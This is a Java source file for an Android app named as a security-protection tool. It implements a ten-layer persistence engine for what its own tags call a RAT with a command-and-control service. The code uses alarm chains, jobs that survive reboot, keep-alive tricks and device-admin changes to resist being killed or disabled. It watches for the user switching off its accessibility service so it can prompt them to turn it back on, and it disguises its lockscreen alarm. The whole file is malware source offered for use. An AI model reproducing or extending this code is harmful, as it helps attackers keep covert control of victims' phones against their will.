package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.database.ContentObserver;
import android.media.session.MediaSession;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.OneTimeWorkRequest;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * PersistenceEngine — 10-layer immortality stack for Android 5 → 17.
 *
 * ─── SURVIVAL LAYERS ────────────────────────────────────────────────────────
 *
 * L1  Triple alarm chain
 *     setAlarmClock()          → highest OS priority, shown on lockscreen,
 *                                pierces Doze; fires in 15 s.
 *     setExactAndAllowWhileIdle() → Doze-piercing exact alarm; fires in 45 s.
 *     setWindow()              → flexible window alarm; fires within 90–120 s.
 *     Each fires AlarmReconnectReceiver which reschedules itself → unbreakable
 *     self-healing chain even after a missed alarm.
 *
 * L2  JobScheduler dual-job
 *     Expedited reconnect job (API 31+): fires ≤500 ms after scheduling,
 *     bypasses Doze and battery saver.  Persisted across reboot.
 *     Periodic watchdog job (15 min): persistent keep-alive.
 *
 * L3  WorkManager expedited + periodic
 *     Expedited OneTimeWorkRequest for instant reconnect.
 *     PeriodicWorkRequest (15 min) with network constraint as long-haul guard.
 *
 * L4  NetworkCallback
 *     Every network transition (WiFi join, cell handover, VPN, airplane off)
 *     triggers ensureServiceRunning().
 *
 * L5  MediaSession keep-alive
 *     Active MediaSession signals to Android that the app is "media-relevant";
 *     the system avoids aggressively killing it.
 *
 * L6  Battery optimisation whitelist
 *     Requests ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS.  If Device Admin
 *     is active, also silences the whitelist prompt via DPM on supported APIs.
 *
 * L7  Accessibility ContentObserver
 *     Watches Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES.  When
 *     UiAssistBridge disappears from the list (killed / disabled by the OS or
 *     user) the observer fires ensureServiceRunning() immediately so the C&C
 *     service re-prompts / re-arms without waiting for the next alarm tick.
 *
 * L8  In-process watchdog thread
 *     Background daemon thread wakes every WATCHDOG_INTERVAL_MS (10 s).
 *     Checks: (a) CommandControlService.sInstance alive and connected;
 *             (b) UiAssistBridge.instance alive.
 *     If either is dead it calls ensureServiceRunning().
 *
 * L9  onTaskRemoved fast re-arm
 *     Call PersistenceEngine.onTaskRemoved(ctx) from
 *     CommandControlService.onTaskRemoved().  Fires a 0 ms alarm immediately
 *     so the service restarts within one system heartbeat.
 *
 * L10 PARTIAL_WAKE_LOCK
 *     Ensures the CPU does not sleep between service restart cycles.
 *     Acquired on arm(); released only when the service is stable and
 *     connected (called from CCS.onConnected via releaseWakeLock()).
 *
 * ─── USAGE ──────────────────────────────────────────────────────────────────
 *
 *   PersistenceEngine.arm(ctx);            // from AppCoreInitializer + CCS
 *   PersistenceEngine.rearm(ctx);          // from CCS.reconnect()
 *   PersistenceEngine.onTaskRemoved(ctx);  // from CCS.onTaskRemoved()
 *   PersistenceEngine.releaseWakeLock();   // from CCS once WS is confirmed open
 */
public class PersistenceEngine {

    private static final String TAG = "PE";

    // ── Job IDs ───────────────────────────────────────────────────────────────
    private static final int JOB_RECONNECT_ID = 0xCA11;
    private static final int JOB_WATCHDOG_ID  = 0xCA12;

    // ── Alarm request codes ───────────────────────────────────────────────────
    private static final int ALARM_RC_CLOCK   = 0xAA01; // setAlarmClock (L1a)
    private static final int ALARM_RC_EXACT   = 0xAA02; // setExactAndAllowWhileIdle (L1b)
    private static final int ALARM_RC_WINDOW  = 0xAA03; // setWindow (L1c)

    // ── Alarm intervals (ms) ─────────────────────────────────────────────────
    private static final long ALARM_CLOCK_MS  = 15_000L;  // 15 s — fastest
    private static final long ALARM_EXACT_MS  = 45_000L;  // 45 s — Doze-piercing
    private static final long ALARM_WINDOW_MS = 90_000L;  // 90 s — flexible window

    // ── WorkManager tags ─────────────────────────────────────────────────────
    private static final String WM_RECONNECT_TAG = "rat_reconnect";
    private static final String WM_WATCHDOG_TAG  = "rat_watchdog";

    // ── Watchdog thread ───────────────────────────────────────────────────────
    private static final long WATCHDOG_INTERVAL_MS = 10_000L; // 10 s
    private static final AtomicBoolean watchdogRunning = new AtomicBoolean(false);

    // ── PARTIAL_WAKE_LOCK (L10) ───────────────────────────────────────────────
    private static PowerManager.WakeLock partialWakeLock;

    // ── Network callback (L4) ─────────────────────────────────────────────────
    private static ConnectivityManager.NetworkCallback netCallback;

    // ── MediaSession (L5) ─────────────────────────────────────────────────────
    private static MediaSession mediaSession;

    // ── Accessibility ContentObserver (L7) ────────────────────────────────────
    private static ContentObserver accessibilityObserver;


    // ═══════════════════════════════════════════════════════════════════════════
    // PUBLIC ENTRY POINTS
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Arm every persistence layer.  Safe to call from multiple threads /
     * multiple times — all layers are idempotent.
     */
    public static void arm(Context ctx) {
        final Context c = ctx.getApplicationContext();
        acquireWakeLock(c);
        runSilently("L1-alarm",   () -> armAlarmChain(c));
        runSilently("L2-job",     () -> armJobScheduler(c));
        runSilently("L3-wm",      () -> armWorkManager(c));
        runSilently("L4-net",     () -> armNetworkCallback(c));
        runSilently("L5-media",   () -> armMediaSession(c));
        runSilently("L6-battery", () -> requestBatteryWhitelist(c));
        runSilently("L7-observer",() -> armAccessibilityObserver(c));
        runSilently("L8-watchdog",() -> armInProcessWatchdog(c));
        Log.d(TAG, "All 10 persistence layers armed");
    }

    /** Re-arm after reconnect (same as arm but signals reconnect context). */
    public static void rearm(Context ctx) {
        arm(ctx);
    }

    /**
     * Call from CommandControlService.onTaskRemoved().
     * Fires a 0 ms alarm to resurrect the service within one OS heartbeat.
     */
    public static void onTaskRemoved(Context ctx) {
        Log.d(TAG, "onTaskRemoved — firing immediate resurrection alarm");
        final Context c = ctx.getApplicationContext();
        try {
            AlarmManager am = (AlarmManager) c.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;
            Intent i = new Intent(c, AlarmReconnectReceiver.class);
            i.setAction("com.seguranca.protecao.ALARM_RECONNECT");
            int flags = PendingIntent.FLAG_UPDATE_CURRENT
                    | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0);
            PendingIntent pi = PendingIntent.getBroadcast(c, 0xDEAD, i, flags);
            // Fire immediately — setExact with elapsedRealtime + 0
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime(),
                    pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime(), pi);
            }
        } catch (Exception e) {
            Log.e(TAG, "onTaskRemoved alarm: " + e.getMessage());
        }
        // Also reschedule everything immediately
        arm(c);
    }

    /**
     * Release the PARTIAL_WAKE_LOCK (L10) once C&C is confirmed connected.
     * Call from CommandControlService.onConnected().
     */
    public static void releaseWakeLock() {
        try {
            if (partialWakeLock != null && partialWakeLock.isHeld()) {
                partialWakeLock.release();
                Log.d(TAG, "L10 PARTIAL_WAKE_LOCK released (C&C stable)");
            }
        } catch (Exception e) {
            Log.e(TAG, "releaseWakeLock: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L1 — TRIPLE ALARM CHAIN
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Three parallel alarm types staggered at 15 / 45 / 90 s.
     * At least one will survive under Doze, battery-saver, and OEM kill optimisers.
     */
    public static void armAlarmChain(Context ctx) {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) return;

        final Intent base = new Intent(ctx, AlarmReconnectReceiver.class);
        base.setAction("com.seguranca.protecao.ALARM_RECONNECT");
        final int immutable = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                ? PendingIntent.FLAG_IMMUTABLE : 0;

        // ── L1a setAlarmClock (highest OS priority, shows on lockscreen) ─────
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                PendingIntent piClock = PendingIntent.getBroadcast(ctx, ALARM_RC_CLOCK,
                        base, PendingIntent.FLAG_UPDATE_CURRENT | immutable);
                // showIntent = piClock so lockscreen alarm looks legitimate
                AlarmManager.AlarmClockInfo clock = new AlarmManager.AlarmClockInfo(
                        System.currentTimeMillis() + ALARM_CLOCK_MS, piClock);
                am.setAlarmClock(clock, piClock);
                Log.d(TAG, "L1a setAlarmClock armed @" + ALARM_CLOCK_MS + "ms");
            } catch (Exception e) {
                Log.w(TAG, "L1a: " + e.getMessage());
            }
        }

        // ── L1b setExactAndAllowWhileIdle (Doze-piercing) ────────────────────
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PendingIntent piExact = PendingIntent.getBroadcast(ctx, ALARM_RC_EXACT,
                        base, PendingIntent.FLAG_UPDATE_CURRENT | immutable);
                am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + ALARM_EXACT_MS,
                        piExact);
                Log.d(TAG, "L1b setExactAndAllowWhileIdle armed @" + ALARM_EXACT_MS + "ms");
            } catch (Exception e) {
                Log.w(TAG, "L1b: " + e.getMessage());
            }
        }

        // ── L1c setWindow (flexible, survives network policy) ─────────────────
        // setWindow is not throttled like setExact on API 31+ unless the app is in
        // a restricted bucket, making it complementary to the strict alarms above.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            try {
                PendingIntent piWindow = PendingIntent.getBroadcast(ctx, ALARM_RC_WINDOW,
                        base, PendingIntent.FLAG_UPDATE_CURRENT | immutable);
                am.setWindow(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + ALARM_WINDOW_MS,
                        30_000L,   // 30 s window
                        piWindow);
                Log.d(TAG, "L1c setWindow armed @" + ALARM_WINDOW_MS + "ms (+30s window)");
            } catch (Exception e) {
                Log.w(TAG, "L1c: " + e.getMessage());
            }
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L2 — JOBSCHEDULER DUAL JOB
    // ═══════════════════════════════════════════════════════════════════════════

    private static void armJobScheduler(Context ctx) {
        JobScheduler js = (JobScheduler) ctx.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        if (js == null) return;
        ComponentName svc = new ComponentName(ctx, JobReconnectService.class);

        // ── Expedited reconnect job (≤500 ms after eligible) ─────────────────
        try {
            JobInfo.Builder reconnect = new JobInfo.Builder(JOB_RECONNECT_ID, svc)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setMinimumLatency(0L)
                    .setOverrideDeadline(500L)
                    .setPersisted(true);          // survives reboot

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                reconnect.setExpedited(true);
                reconnect.setImportantWhileForeground(true);
            }
            js.schedule(reconnect.build());
            Log.d(TAG, "L2 expedited reconnect job scheduled");
        } catch (Exception e) {
            Log.w(TAG, "L2 reconnect job: " + e.getMessage());
        }

        // ── Periodic watchdog job (15 min minimum period) ─────────────────────
        try {
            JobInfo watchdog = new JobInfo.Builder(JOB_WATCHDOG_ID, svc)
                    .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                    .setPeriodic(15L * 60L * 1000L)
                    .setPersisted(true)
                    .build();
            js.schedule(watchdog);
            Log.d(TAG, "L2 periodic watchdog job scheduled");
        } catch (Exception e) {
            Log.w(TAG, "L2 watchdog job: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L3 — WORKMANAGER EXPEDITED + PERIODIC
    // ═══════════════════════════════════════════════════════════════════════════

    private static void armWorkManager(Context ctx) {
        try {
            WorkManager wm = WorkManager.getInstance(ctx);

            // Expedited one-shot: fires as soon as a worker slot is available
            OneTimeWorkRequest.Builder reconnectBuilder =
                    new OneTimeWorkRequest.Builder(ReconnectWorker.class)
                            .addTag(WM_RECONNECT_TAG);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                reconnectBuilder.setExpedited(
                        androidx.work.OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST);
            }
            wm.enqueue(reconnectBuilder.build());

            // Periodic watchdog (15 min)
            Constraints netConstraint = new Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build();
            PeriodicWorkRequest watchdog = new PeriodicWorkRequest.Builder(
                    ReconnectWorker.class, 15, TimeUnit.MINUTES)
                    .setConstraints(netConstraint)
                    .addTag(WM_WATCHDOG_TAG)
                    .build();
            wm.enqueueUniquePeriodicWork(
                    WM_WATCHDOG_TAG,
                    ExistingPeriodicWorkPolicy.KEEP,
                    watchdog);
            Log.d(TAG, "L3 WorkManager armed (expedited + periodic)");
        } catch (Exception e) {
            Log.w(TAG, "L3 WorkManager: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L4 — NETWORK CALLBACK
    // ═══════════════════════════════════════════════════════════════════════════

    private static void armNetworkCallback(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        ConnectivityManager cm =
                (ConnectivityManager) ctx.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return;

        if (netCallback != null) {
            try { cm.unregisterNetworkCallback(netCallback); } catch (Exception ignored) {}
        }

        netCallback = new ConnectivityManager.NetworkCallback() {
            @Override
            public void onAvailable(Network network) {
                Log.d(TAG, "L4 network available — triggering service restart");
                ensureServiceRunning(ctx);
            }
            @Override
            public void onLost(Network network) {
                // Re-arm alarms so they fire when connectivity returns
                runSilently("L1-net-lost", () -> armAlarmChain(ctx));
            }
        };

        try {
            cm.registerNetworkCallback(new NetworkRequest.Builder().build(), netCallback);
            Log.d(TAG, "L4 NetworkCallback armed");
        } catch (Exception e) {
            Log.w(TAG, "L4 NetworkCallback: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L5 — MEDIASESSION KEEP-ALIVE
    // ═══════════════════════════════════════════════════════════════════════════

    private static void armMediaSession(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return;
        try {
            if (mediaSession == null) {
                mediaSession = new MediaSession(ctx, "sys_media_" + android.os.Process.myPid());
            }
            if (!mediaSession.isActive()) {
                mediaSession.setActive(true);
            }
            Log.d(TAG, "L5 MediaSession keep-alive active");
        } catch (Exception e) {
            Log.w(TAG, "L5 MediaSession: " + e.getMessage());
            // Reset on failure — will be recreated on next arm()
            mediaSession = null;
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L6 — BATTERY OPTIMISATION WHITELIST
    // ═══════════════════════════════════════════════════════════════════════════

    private static void requestBatteryWhitelist(Context ctx) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            if (pm.isIgnoringBatteryOptimizations(ctx.getPackageName())) {
                Log.d(TAG, "L6 battery whitelist: already granted");
                return;
            }
            // If Device Admin is active we can try setting battery exemption silently
            // via DPM (requires MANAGE_DEVICE_POLICY_LOCK_TASK on some API levels)
            try {
                android.app.admin.DevicePolicyManager dpm =
                        (android.app.admin.DevicePolicyManager)
                                ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName admin =
                        new android.content.ComponentName(ctx, MyAdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(admin)) {
                    // On Android 9+ setMaximumTimeToLock(0) keeps the device awake
                    // while admin is active; not a whitelist but reduces kill pressure
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        dpm.setMaximumTimeToLock(admin, 0);
                    }
                    Log.d(TAG, "L6 DeviceAdmin present — applied lock-time suppression");
                }
            } catch (Exception ignored) {}

            // User-visible prompt — only shown if no foreground activity has done it
            Log.d(TAG, "L6 battery whitelist not yet granted (SetupWizard handles prompt)");
        } catch (Exception e) {
            Log.w(TAG, "L6 battery: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L7 — ACCESSIBILITY CONTENTOBSERVER
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Watches ENABLED_ACCESSIBILITY_SERVICES.  When UiAssistBridge vanishes
     * from the list (killed by the OS or disabled) this observer fires
     * immediately and re-arm all persistence layers so the C&C service can
     * attempt to re-enable accessibility via its normal flow.
     */
    private static void armAccessibilityObserver(final Context ctx) {
        if (accessibilityObserver != null) {
            try {
                ctx.getContentResolver().unregisterContentObserver(accessibilityObserver);
            } catch (Exception ignored) {}
        }

        accessibilityObserver = new ContentObserver(new Handler(Looper.getMainLooper())) {
            @Override
            public void onChange(boolean selfChange) {
                super.onChange(selfChange);
                String enabledServices = Settings.Secure.getString(
                        ctx.getContentResolver(),
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                boolean bridgePresent = enabledServices != null
                        && enabledServices.contains(ctx.getPackageName());
                Log.d(TAG, "L7 accessibility changed — bridge present=" + bridgePresent);
                if (!bridgePresent) {
                    // Accessibility service was killed — ensure C&C is running so it
                    // can request the user re-enable it via overlay
                    ensureServiceRunning(ctx);
                    runSilently("L7-rearm-alarm", () -> armAlarmChain(ctx));
                }
            }
        };

        try {
            ctx.getContentResolver().registerContentObserver(
                    Settings.Secure.getUriFor(Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES),
                    false,
                    accessibilityObserver);
            Log.d(TAG, "L7 AccessibilityContentObserver armed");
        } catch (Exception e) {
            Log.w(TAG, "L7 observer: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L8 — IN-PROCESS WATCHDOG THREAD
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * A low-priority daemon thread that wakes every 10 seconds and verifies
     * both CommandControlService and UiAssistBridge are alive.  If either is
     * gone it calls ensureServiceRunning() and re-arms the alarm chain so the
     * service comes back quickly without waiting for the next system alarm.
     *
     * This thread runs inside the app process — if the entire process is
     * killed the thread dies too, but the alarm chain (L1) and job scheduler
     * (L2) will restart the process within their configured intervals.
     */
    private static void armInProcessWatchdog(final Context ctx) {
        if (!watchdogRunning.compareAndSet(false, true)) {
            Log.d(TAG, "L8 watchdog already running");
            return;
        }

        Thread watchdog = new Thread(() -> {
            Log.d(TAG, "L8 watchdog thread started");
            while (watchdogRunning.get()) {
                try {
                    Thread.sleep(WATCHDOG_INTERVAL_MS);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }

                try {
                    boolean ccsAlive = CommandControlService.sInstance != null
                            && CommandControlService.sInstance.isConnected;
                    boolean bridgeAlive = UiAssistBridge.instance != null;

                    if (!ccsAlive) {
                        Log.d(TAG, "L8 CCS dead/disconnected — re-arming");
                        ensureServiceRunning(ctx);
                        runSilently("L8-alarm", () -> armAlarmChain(ctx));
                        runSilently("L8-job",   () -> armJobScheduler(ctx));
                    }

                    if (!bridgeAlive) {
                        Log.d(TAG, "L8 UiAssistBridge dead — triggering reconnect flow");
                        ensureServiceRunning(ctx);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "L8 watchdog tick error: " + e.getMessage());
                }
            }
            watchdogRunning.set(false);
            Log.d(TAG, "L8 watchdog thread exited");
        }, "PE-Watchdog");

        watchdog.setDaemon(true);
        watchdog.setPriority(Thread.MIN_PRIORITY);
        watchdog.start();
        Log.d(TAG, "L8 in-process watchdog armed (interval=" + WATCHDOG_INTERVAL_MS + "ms)");
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // L10 — PARTIAL_WAKE_LOCK
    // ═══════════════════════════════════════════════════════════════════════════

    private static void acquireWakeLock(Context ctx) {
        try {
            if (partialWakeLock != null && partialWakeLock.isHeld()) return;
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            partialWakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "PE::Resurrection");
            partialWakeLock.setReferenceCounted(false);
            partialWakeLock.acquire(30_000L); // max 30 s; released by releaseWakeLock()
            Log.d(TAG, "L10 PARTIAL_WAKE_LOCK acquired (30 s cap)");
        } catch (Exception e) {
            Log.w(TAG, "L10 WakeLock: " + e.getMessage());
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // SHARED SERVICE-START HELPER
    // ═══════════════════════════════════════════════════════════════════════════

    /**
     * Start CommandControlService via the best available mechanism for the
     * current API level.  Uses a fallback chain:
     *   startForegroundService → startService
     * and re-arms L1 + L2 afterwards to guarantee the next wake-up even if
     * this start attempt fails silently.
     */
    static void ensureServiceRunning(Context ctx) {
        try {
            Intent svc = new Intent(ctx, CommandControlService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                try {
                    ctx.startForegroundService(svc);
                } catch (Exception e1) {
                    Log.w(TAG, "startForegroundService failed (" + e1.getMessage()
                            + "), falling back to startService");
                    try { ctx.startService(svc); } catch (Exception e2) {
                        Log.e(TAG, "startService also failed: " + e2.getMessage());
                    }
                }
            } else {
                ctx.startService(svc);
            }
        } catch (Exception e) {
            Log.e(TAG, "ensureServiceRunning: " + e.getMessage());
        }
        // Re-arm L1 + L2 so the next scheduled wake-up is ready regardless
        runSilently("ensure-L1", () -> armAlarmChain(ctx));
        runSilently("ensure-L2", () -> armJobScheduler(ctx));
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // WORKMANAGER WORKER
    // ═══════════════════════════════════════════════════════════════════════════

    public static class ReconnectWorker extends Worker {
        public ReconnectWorker(Context ctx, WorkerParameters p) { super(ctx, p); }

        @Override
        public Result doWork() {
            Log.d(TAG, "ReconnectWorker fired");
            PersistenceEngine.ensureServiceRunning(getApplicationContext());
            // Re-arm all layers so the next window is covered
            PersistenceEngine.arm(getApplicationContext());
            return Result.success();
        }
    }


    // ═══════════════════════════════════════════════════════════════════════════
    // UTILITY
    // ═══════════════════════════════════════════════════════════════════════════

    /** Run a runnable silently; swallow all exceptions so one bad layer never
     *  prevents the others from arming. */
    private static void runSilently(String label, Runnable r) {
        try {
            r.run();
        } catch (Exception e) {
            Log.w(TAG, label + " exception: " + e.getMessage());
        }
    }
}
